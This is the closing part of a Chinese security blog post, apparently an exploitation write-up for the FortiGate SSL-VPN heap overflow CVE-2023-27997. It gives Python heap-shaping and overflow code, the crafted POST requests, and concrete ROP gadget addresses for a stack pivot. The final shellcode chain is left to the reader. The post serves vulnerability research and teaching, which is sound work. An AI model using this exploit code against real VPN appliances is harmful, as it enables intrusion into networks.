<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-d1f8e940e7046fe389e9ecf78392c333-9e4181.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-d1f8e940e7046fe389e9ecf78392c333-9e4181.png" alt="image.png"></a></p>
<p>可以发现默认情况下 <code>0x2000</code> 这么的大的内存是不会怎么使用到的， 因此我们只需要先分配几次 （这里使用 10 次 ）分配0x2000 的 buffer，然后释放掉让这连续的内存进入到链表里，方便后面利用的时候让 out 的缓冲区在 ssl 结构体前面。这里的分配原理是通过一个请求给一个解析POST参数的网页 ， 在这个请求中，发送了POST key-value对， 其中sizeof(key) = sizeof(struct_ssl) - 0x18 - 0x10 而sizeof(value)=0 ， 例如我们发送一个</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;remote&#x2F;hostcheck_validate HTTP&#x2F;1.1</span><br><span class="line"></span><br><span class="line">A*(sizeof(struct_ssl) - 0x18 - 0x10)&#x3D;&amp;</span><br></pre></td></tr></table></figure>

<p>这样理想情况下会分分配一个如下的内存：</p>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-ce0846e872e41e303b2eca5ef364df90-704e11.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-ce0846e872e41e303b2eca5ef364df90-704e11.png" alt="image.png"></a></p>
<p>有三个 <code>AAAA</code> 的内存原因是在解析POST数据的时候，程序会这么做：拿到整个POSTDATA缓冲区（例如a=b&amp;c=d&amp;e=f），然后提取出’&amp;’之前的内容，并把它存储在一个新的块里（那是1个分配）。然后，拿到’=’之前的内容，并把它存储在一个新的块里（两个分配）。然后，它将键和值存储在一个全局哈希映射中，这会导致产生第三个分配</p>
<p>这里为了方便观察分配的情况， 我们还可以用到 gdb 的commands 和 logging 功能。大致就是在 <code>je_malloc</code> 分配结束后下断</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;.text:0000000001776C85 E8 D6 5A CC+                call    _je_malloc</span><br><span class="line">&#x2F;&#x2F;.text:0000000001776C8A 49 89 C4                    mov     r12, rax</span><br><span class="line">break *0x1776C8A </span><br><span class="line">commands 1</span><br><span class="line">	set logging file ssl_chunk.txt</span><br><span class="line">	set logging enable on</span><br><span class="line">	p&#x2F;x $rax</span><br><span class="line">	set logging enable off</span><br><span class="line">	continue</span><br><span class="line">end</span><br></pre></td></tr></table></figure>

<p>我们尽量让其分配的时候是连续的内存：</p>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-bc72ef0094686857032b3a9e058315e3-c9a332.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-bc72ef0094686857032b3a9e058315e3-c9a332.png" alt="image.png"></a></p>
<p>当然在实际环境中可能有其他的干扰，因此我们可以多分配几次 ，例如我上个版本的利用是分配了 <code>301</code> 次， 然后在这几个 sock 都close掉让其释放。我这部分代码如下。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">heap_layout</span>(<span class="params">IP, port</span>):</span></span><br><span class="line">    <span class="comment"># heap layout</span></span><br><span class="line">    payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">import</span> string</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> string.printable[:<span class="number">10</span>]:</span><br><span class="line">        payload += i*(size) + <span class="string">&#x27;=&amp;&#x27;</span></span><br><span class="line"></span><br><span class="line">    sock = make_ssl_socket(IP, port, if_warp=<span class="literal">True</span>)</span><br><span class="line">    sock = set_heap_fengshui(sock, payload)</span><br><span class="line">    sock.close()</span><br></pre></td></tr></table></figure>

<p>这样之后，我们需要创建两个 sock  ， 代码如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do_rewrtie_ssl_struct</span>(<span class="params">IP, port, salt, seeds</span>):</span></span><br><span class="line">    log.info(<span class="string">&#x27;Creating sockets...&#x27;</span>)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    vul_sock = make_ssl_socket(IP, port, if_warp=<span class="literal">True</span>)</span><br><span class="line">    sock4 = make_ssl_socket(IP, port)</span><br><span class="line">    sock4.sendall(<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    log.info(<span class="string">&#x27;Rewrite SSL struct&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> seed <span class="keyword">in</span> seeds:</span><br><span class="line">        <span class="keyword">for</span> offset <span class="keyword">in</span> seed:</span><br><span class="line">            write_value(vul_sock, salt, seed[offset].decode(<span class="string">&#x27;latin1&#x27;</span>), offset)</span><br><span class="line">    <span class="keyword">return</span> (vul_sock, sock4)</span><br></pre></td></tr></table></figure>

<p>其中一个 <code>vul_sock</code> 是用来溢出 buffer ， 然后 sock4 是用来分配 ssl 结构体， 用来被溢出的。 这样之后我们就能稳定触发溢出，且稳定的让 ssl 结构体分配在 out 的缓冲区后面<br>。</p>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-a4930365eb0a53489ff736eff83e0c9e-f36a67.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-a4930365eb0a53489ff736eff83e0c9e-f36a67.png" alt="image.png"></a></p>
<h3 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h3><p>当触发溢出的时候， 我们的这个时候指针和内存大概如下：</p>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-4994090cd5a6c71e1d1c02b3a843fe13-a5245c.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-4994090cd5a6c71e1d1c02b3a843fe13-a5245c.png" alt="image.png"></a></p>
<p>我们可以发现，当我们控制 PC  后， 这里的 <code>RDI</code> 寄存器指向的是我们的 ssl 结构体， 因此第一个涌上的思路是做栈迁移， 找一个类似于</p>
<p><code>push rdi; pop rsp; ... ; ret </code> 的 gadget 即可， 我们最后使用的是 <code>push_rdi_pop_rsp = 0x669129 # push rdi ; pop rsp ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret</code></p>
<p>这样就将栈成功迁移到了我们的 ssl stuct ， 即可控的可写的缓冲区内。 然后这里预期直接在 ssl 缓冲区接着写我们剩下的 <code>gadget</code> ， 但是这里突然发现了一个问题， ssl struct 似乎有很多结构体不能被写， 一写就报错 。</p>
<p>于是我在这里换了个思路， 接着尝试布局堆结构，理想情况应该是：</p>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-feac6e93867e3afd30cd73f00de7c7f0-2031ee.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-feac6e93867e3afd30cd73f00de7c7f0-2031ee.png" alt="image.png"></a></p>
<p>或者</p>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-8af32ae43ee156ed62aff6c50e7ba555-cc0cbe.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-8af32ae43ee156ed62aff6c50e7ba555-cc0cbe.png" alt="image.png"></a></p>
<p>在 out 前面 ， 或者 ssl struct 的后面布局一块完全可控的内存， 但是由于我们的这块完全可控的内存是不能被 00 截断的， 因此key-value 对的  key 似乎是不能用来布局的，但是这里我想了下， key 不能被用来布局堆， 但是 value 应该是可以的！！ 因此我在溢出结束之后， 接着尝试用如下代码发包：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">layout_gadget</span>(<span class="params">IP, port</span>):</span></span><br><span class="line">    ropchain = build_ropchain(args)</span><br><span class="line">    sock = make_ssl_socket(IP, port, if_warp=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        junk = cyclic(size, n=<span class="number">8</span>)</span><br><span class="line">        pay = bytearray(junk)</span><br><span class="line">        <span class="comment">#pay[1: 1+13 * 8] = p64(ret) * 13</span></span><br><span class="line">        <span class="comment">#pay[105:105+len(ropchain)]  = ropchain</span></span><br><span class="line">        junk = bytes(pay)</span><br><span class="line"></span><br><span class="line">        payload = <span class="string">&#x27;aaaa&#x27;</span> + <span class="string">&#x27;=&#x27;</span> + junk + <span class="string">&#x27;&amp;&#x27;</span> + <span class="string">&#x27;bbbb&#x27;</span> + <span class="string">&#x27;=&#x27;</span> + junk + <span class="string">&#x27;&amp;&#x27;</span> + <span class="string">&#x27;cccc&#x27;</span> + <span class="string">&#x27;=&#x27;</span> + junk + <span class="string">&#x27;&amp;&#x27;</span> + <span class="string">&#x27;dddd&#x27;</span> + <span class="string">&#x27;=&#x27;</span> + junk + <span class="string">&#x27;&amp;&#x27;</span> + <span class="string">&#x27;eeee&#x27;</span> + <span class="string">&#x27;=&#x27;</span> + junk </span><br><span class="line">        payload += <span class="string">&#x27;&amp;username=vvvv&#x27;</span></span><br><span class="line">        sock = set_heap_fengshui(sock, payload)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> sock</span><br></pre></td></tr></table></figure>

<p>成功在 out 缓冲区写下了一块可控的内存</p>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-d9a69e8ee03dbce4df4a250e873625d0-092293.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-d9a69e8ee03dbce4df4a250e873625d0-092293.png" alt="image.png"></a></p>
<p>因此此时内存结构如下：</p>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-b44f04c102f10f092eb78af81e384f08-6327ef.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-b44f04c102f10f092eb78af81e384f08-6327ef.png" alt="image.png"></a></p>
<p>由于 ssl struct 有很多不能写的地方， 于是我想到一个方法， 尝试去找大量连续是 0 的缓冲区， 然后仅仅写入另外一段 stack pivot chain，将栈迁移到前面的可控缓冲区中 。最后我使用了这样的 chain ：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x000000000060bdb4   # pop rax ; pop rdx ; ret</span><br><span class="line">bss_addr &#x3D; 0x4698eb0 # -&gt; rax</span><br><span class="line">offfset &#x3D;  0x26e0-1  # rdx -&gt; ropchain</span><br><span class="line">0x61a292  # : sub rsp, rdx ; dec dword ptr [rax - 0x77] ; ret</span><br></pre></td></tr></table></figure>

<p>通过这条 chain， 将栈迁移到前面的缓冲区， 进行更复杂的操作。</p>
<h3 id="执行任意指令"><a href="#执行任意指令" class="headerlink" title="执行任意指令"></a>执行任意指令</h3><p>在完成此部分之后，接下来就是组装ROP链的过程了。尽管该程序非常庞大，以至于几乎可以找到所需的任何gadget链，但找寻gadget终究是一个相对繁琐的任务。因此，最后决定采用mprotect + shellcode的方法。首先，利用一些gadget将rdi指向ROP链的内存开头。</p>
<p>这一部分内容就留作给读者完成吧</p>
<h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><h2 id="Reference-link"><a href="#Reference-link" class="headerlink" title="Reference link"></a>Reference link</h2><p>^[1]   <a href="https://labs.watchtowr.com/xortigate-or-cve-2023-27997/">https://labs.watchtowr.com/xortigate-or-cve-2023-27997/</a><br>^[2]  <a href="https://blog.lexfo.fr/xortigate-cve-2023-27997.html">https://blog.lexfo.fr/xortigate-cve-2023-27997.html</a><br>^[3] <a href="https://devco.re/blog/2019/08/09/attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn/#:~:text=The%20crash%20happened%20in">attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn</a><br>^[4] <a href="https://github.dev/openssl/openssl/tree/openssl-3.0.0%E2%89%A5">https://github.dev/openssl/openssl/tree/openssl-3.0.0≥</a></p>
</div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
        var options = {
            selector: '.gallery-item'
        };
        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
        }</script>
  </div>
</article>

    <div class="blog-post-comments">
        <div id="disqus_thread">
            <noscript>Please enable JavaScript to view the comments.</noscript>
        </div>
    </div>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/search">Search</a></li>
         
          <li><a href="/atom.xml">RSS</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/link">Links</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.</span> <span class="toc-text">漏洞环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%8E%9F%E8%AF%AD"><span class="toc-number">3.1.</span> <span class="toc-text">利用原语</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A0%86%E5%B8%83%E5%B1%80"><span class="toc-number">3.2.</span> <span class="toc-text">堆布局</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%88%E8%BF%81%E7%A7%BB"><span class="toc-number">3.3.</span> <span class="toc-text">栈迁移</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E4%BB%BB%E6%84%8F%E6%8C%87%E4%BB%A4"><span class="toc-number">3.4.</span> <span class="toc-text">执行任意指令</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Demo"><span class="toc-number">4.</span> <span class="toc-text">Demo</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference-link"><span class="toc-number">5.</span> <span class="toc-text">Reference link</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://bestwing.me/CVE-2023-27997-FortiGate-SSLVPN-Heap-Overflow.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=https://bestwing.me/CVE-2023-27997-FortiGate-SSLVPN-Heap-Overflow.html&text=CVE-2023-27997-FortiGate-SSLVPN-HeapOverflow"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://bestwing.me/CVE-2023-27997-FortiGate-SSLVPN-Heap-Overflow.html&title=CVE-2023-27997-FortiGate-SSLVPN-HeapOverflow"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://bestwing.me/CVE-2023-27997-FortiGate-SSLVPN-Heap-Overflow.html&is_video=false&description=CVE-2023-27997-FortiGate-SSLVPN-HeapOverflow"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=CVE-2023-27997-FortiGate-SSLVPN-HeapOverflow&body=Check out this article: https://bestwing.me/CVE-2023-27997-FortiGate-SSLVPN-Heap-Overflow.html"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=https://bestwing.me/CVE-2023-27997-FortiGate-SSLVPN-Heap-Overflow.html&title=CVE-2023-27997-FortiGate-SSLVPN-HeapOverflow"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=https://bestwing.me/CVE-2023-27997-FortiGate-SSLVPN-Heap-Overflow.html&title=CVE-2023-27997-FortiGate-SSLVPN-HeapOverflow"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://bestwing.me/CVE-2023-27997-FortiGate-SSLVPN-Heap-Overflow.html&title=CVE-2023-27997-FortiGate-SSLVPN-HeapOverflow"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=https://bestwing.me/CVE-2023-27997-FortiGate-SSLVPN-Heap-Overflow.html&title=CVE-2023-27997-FortiGate-SSLVPN-HeapOverflow"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://bestwing.me/CVE-2023-27997-FortiGate-SSLVPN-Heap-Overflow.html&name=CVE-2023-27997-FortiGate-SSLVPN-HeapOverflow&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://bestwing.me/CVE-2023-27997-FortiGate-SSLVPN-Heap-Overflow.html&t=CVE-2023-27997-FortiGate-SSLVPN-HeapOverflow"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2016-2023
    Swing
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/search">Search</a></li>
         
          <li><a href="/atom.xml">RSS</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/link">Links</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">


    <!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>

<!-- clipboard -->

  
<script src="/lib/clipboard/clipboard.min.js"></script>

  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-133464311-1"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        gtag('config', 'UA-133464311-1');
    </script>

<!-- Baidu Analytics -->

  <script type="text/javascript">
        var _hmt = _hmt || [];
        (function() {
          var hm = document.createElement("script");
          hm.src = "https://hm.baidu.com/hm.js?2e6da3c375c8a87f5b664cea6d4cb29c";
          var s = document.getElementsByTagName("script")[0];
          s.parentNode.insertBefore(hm, s);
        })();
        </script>

<!-- Umami Analytics -->

<!-- Disqus Comments -->

    <script type="text/javascript">
        var disqus_shortname = 'swing';

        (function(){
            var dsq = document.createElement('script');
            dsq.type = 'text/javascript';
            dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        }());
    </script>


</body>
</html>
